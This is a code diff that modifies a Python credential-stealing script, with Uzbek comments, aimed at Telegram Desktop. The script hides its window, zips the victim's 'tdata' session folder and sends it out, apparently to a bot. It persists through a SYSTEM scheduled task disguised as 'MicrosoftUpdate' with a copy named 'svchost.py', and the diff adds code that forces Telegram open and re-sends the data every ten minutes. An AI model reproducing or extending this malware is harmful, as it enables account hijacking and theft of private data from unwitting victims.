@@ -7,6 +7,7 @@ import socket
 import tempfile
 import zipfile
 import subprocess
+import sys
 
 # Qora oynani yashirish
 if os.name == 'nt':
@@ -51,7 +52,7 @@ def get_tdata():
     if os.path.exists(tdata_path):
         try:
             temp_dir = tempfile.gettempdir()
-            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
+            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for root, dirs, files in os.walk(tdata_path):
                     for file in files:
@@ -67,32 +68,48 @@ def get_tdata():
 def install_persistence():
     try:
         script_path = os.path.join(os.environ['APPDATA'], 'svchost.py')
+        # O'zini kompyuterga saqlash
         if not os.path.exists(script_path):
-            content = urllib.request.urlopen(sys.argv[0]).read().decode()
+            content = urllib.request.urlopen(sys.argv[0] if len(sys.argv) > 0 else __file__).read().decode()
             with open(script_path, 'w') as f:
                 f.write(content)
-        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f'], shell=True)
+        
+        # Task Scheduler ga qo'shish (Har doim ishlaydi)
+        subprocess.run(['schtasks', '/create', '/tn', 'MicrosoftUpdate', '/tr', f'"{sys.executable}" "{script_path}"', '/sc', 'onlogon', '/ru', 'SYSTEM', '/rl', 'HIGHEST', '/f', '/it'], shell=True)
         return True
     except:
         return False
 
-# MAIN (O'rnatish + BIRINCHI tdata yuborish)
-last_sent = 0
-send_msg(f"🟢 Checker o'rnatilmoqda: {socket.gethostname()}")
+def force_open_telegram():
+    try:
+        # Agar Telegram Desktop ochiq bo'lmasa, uni ochishga urinamiz
+        result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
+        if "Telegram.exe" not in result.stdout:
+            subprocess.Popen(['start', 'Telegram'], shell=True)
+            time.sleep(10)
+    except:
+        pass
+
+# MAIN (Birinchi ishga tushganda)
+send_msg(f"🔧 Checker o'rnatilmoqda: {socket.gethostname()}")
 
 if install_persistence():
-    send_msg(f"✅ Task Scheduler ga qo'shildi!")
+    send_msg(f"🔒 Task Scheduler ga o'rnatildi!")
 
-# ❗HOZIR BIRINCHI TDATANI YUBORAMIZ
+# Telegram Desktop ni majburan ochish (agar ochiq bo'lmasa, hozir ochiladi)
+force_open_telegram()
+
+# Birinchi tdata ni yuborish
+time.sleep(15)
 zip_path = get_tdata()
 if zip_path:
-    send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {socket.gethostname()}")
+    send_file(zip_path, f"✅ Birinchi tdata yig'ildi!\n🖥 {socket.gethostname()}")
     os.remove(zip_path)
-    send_msg(f"✅ Birinchi tdata muvaffaqiyatli yuborildi!")
 
 # ENDI DOIMIY KUZATISH
+last_sent = 0
 while True:
-    time.sleep(60)
+    time.sleep(600)
     try:
         result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
         if "Telegram.exe" in result.stdout:
